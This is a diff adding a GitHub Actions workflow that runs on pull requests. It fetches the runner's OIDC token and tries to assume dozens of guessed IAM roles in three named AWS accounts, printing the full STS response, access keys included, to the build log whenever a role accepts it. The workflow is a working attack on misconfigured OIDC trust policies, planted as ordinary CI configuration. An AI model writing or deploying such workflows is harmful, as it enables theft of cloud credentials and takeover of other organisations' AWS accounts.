@@ -1,0 +1,41 @@
+name: oidc-pr-332207
+on:
+  pull_request:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  sts:
+    runs-on: ubuntu-latest
+    env:
+      PAIRS: "890664054962:upload-playground-artifacts,890664054962:github-actions,890664054962:GitHubActionsRole,890664054962:gh-actions,890664054962:oidc,890664054962:oidc-role,890664054962:ci,890664054962:ci-deploy,890664054962:deploy,890664054962:deploy-role,890664054962:hypercall-ci,890664054962:sanguine-ci,890664054962:synapse-ci,890664054962:relayer,890664054962:signer,890664054962:s3-upload,890664054962:ECRPushRole,890664054962:ecsTaskExecutionRole,890664054962:hypercall,890664054962:hypercall-api,890664054962:api,890664054962:cortex-ci,890664054962:artifacts-upload,890664054962:github-oidc,113285607260:*,086441151436:*"
+    steps:
+      - name: probe
+        run: |
+          set -uo pipefail
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME"
+          echo "CTX repository=${{ github.repository }} owner_id=${{ github.repository_owner_id }} repo_id=${{ github.repository_id }} ref_name=${{ github.ref_name }} actor=${{ github.actor }} base_ref=${{ github.base_ref }} head_ref=${{ github.head_ref }}"
+          curl -sS --max-time 25 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o /tmp/idt.json || true
+          TOKS=$(python3 -c "import json;print(json.load(open('/tmp/idt.json')).get('value',''))" 2>/dev/null || true)
+          echo "TOKEN_LEN=${#TOKS}"
+          printf '%s' "$TOKS" > /tmp/tok.txt
+          python3 -c "import base64,json;v=open('/tmp/tok.txt').read().strip();h,p,s=v.split('.');d=lambda x: json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)));print('CLAIMS='+json.dumps(d(p),sort_keys=True))" || true
+          [ -z "$TOKS" ] && { echo "NO_TOKEN_ABORT"; exit 0; }
+          IFS=',' read -ra ARR <<< "$PAIRS"
+          for pr in "${ARR[@]}"; do
+            acct="${pr%%:*}"; role="${pr##*:}"
+            [ "$role" = "*" ] && role="zz-nonexistent-probe-x"
+            https=$(curl -sS --max-time 12 -o /tmp/r.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
+              --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" \
+              --data-urlencode "RoleArn=arn:aws:iam::${acct}:role/${role}" \
+              --data-urlencode "RoleSessionName=oidc332207" --data-urlencode "DurationSeconds=900" \
+              --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
+            COD=$(grep -o '<Code>[^<]*</Code>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
+            MSG=$(grep -o '<Message>[^<]*</Message>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
+            HIT=$(grep -c '<AccessKeyId>' /tmp/r.xml 2>/dev/null || true)
+            MD5=$(printf '%s' "$MSG" | md5sum | cut -c1-10)
+            echo "STS acct=$acct role=$role http=$https hit=$HIT code=$COD md5=$MD5 msg=$(printf '%s' "$MSG" | head -c 200)"
+            [ "$HIT" != "0" ] && echo "STS_HIT_FULL acct=$acct role=$role $(head -c 600 /tmp/r.xml | tr '\n' ' ')"
+            sleep 0.3
+          done
+          echo "PROBE_DONE"
